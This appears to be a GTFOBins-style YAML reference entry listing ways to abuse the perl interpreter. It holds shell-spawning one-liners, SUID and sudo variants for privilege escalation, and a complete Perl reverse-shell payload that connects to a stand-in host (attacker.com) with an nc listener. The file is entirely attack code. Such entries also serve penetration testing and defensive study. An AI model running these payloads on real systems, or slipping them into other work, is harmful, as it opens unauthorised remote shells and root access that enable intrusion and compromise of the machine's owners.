---
functions:
  execute-interactive:
    - code: perl -e 'exec "/bin/sh";'
  reverse-shell-interactive:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  suid-enabled:
    - code: ./perl -e 'exec "/bin/sh";'
  sudo-enabled:
    - code: sudo perl -e 'exec "/bin/sh";'
---
